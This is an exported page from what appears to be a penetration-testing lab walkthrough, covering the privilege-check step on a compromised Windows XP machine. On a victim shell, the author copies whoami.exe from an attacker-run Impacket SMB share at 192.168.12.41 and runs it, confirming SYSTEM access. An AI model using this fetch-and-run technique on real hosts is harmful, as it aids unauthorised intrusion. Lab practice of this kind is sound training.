<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4. Privilege Escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>4. Privilege Escalation</u></b></h1><br />We still need to escalate to “NT AUTHORITY”, if not already. Let’s find a way to check whats our username. This proved to be more difficult than expected. whoami didn’t work.<br /><br />The “set” command in Windows is similar to Linux’s env. There’s no USERDOMAIN or USERNAME to tell us if we are NT AUTHORITY / SYSTEM. As this thread explains this can be difficult. <br /><br />Try on the Victime Machine shell.<br /><br /><div class="codebox"><div class="codebox">C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\W</span>INDOWS<span style="color:#333333;font-weight:400">\s</span>ystem32<span style="color:#ffdd00;font-weight:400">&gt;</span>set<br /></div></div><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/8-1.png" alt="images/8-1.png" /><br /><br />Kali by default has a whoami.exe Windows binary we can run, after transferring over.<br /><br />Let's do it.<br /><br />a) Search in you Kali Machine “whoami.exe”.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$locate</span>&nbsp;whoami.exe</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">/usr/share/windows-resources/binaries/whoami.exe</span><br /><br />b) Copy the file to the directory “winxpsp3”.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>windows-resources<span style="color:#ff9d00;font-weight:700">/</span>binaries<span style="color:#ff9d00;font-weight:700">/</span>whoami.exe&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>Downloads<span style="color:#ff9d00;font-weight:700">/</span>winxpsp3<span style="color:#ff9d00;font-weight:700">/</span><br /></div></div><br /><br />c) Run Impacket’s “smbserver.py” to start up a SMB share so we can copy “whoami.exe” over to our target then run it. <br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>Downloads<span style="color:#ff9d00;font-weight:700">/</span>winxpsp3<br /><span style="color:#7f0044;font-weight:400">$smbserver</span>.py&nbsp;Lab&nbsp;<span style="color:#3ad900;font-weight:400">"/root/Downloads/winxpsp3/"</span></div></div><br /><br />d) In your Victime Machine shell run the following.<br /><br /><div class="codebox"><div class="codebox">C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span><span style="color:#ff9d00;font-weight:700">dir</span>&nbsp;<span style="color:#333333;font-weight:400">\\</span>192.168.12.41<span style="color:#333333;font-weight:400">\L</span>ab<br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span>copy&nbsp;<span style="color:#333333;font-weight:400">\\</span>192.168.12.41<span style="color:#333333;font-weight:400">\L</span>ab<span style="color:#333333;font-weight:400">\w</span>hoami.exe&nbsp;.<br />c<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\w</span>hoami.exe&nbsp;</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">NT AUTHORITY\SYSTEM</span><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>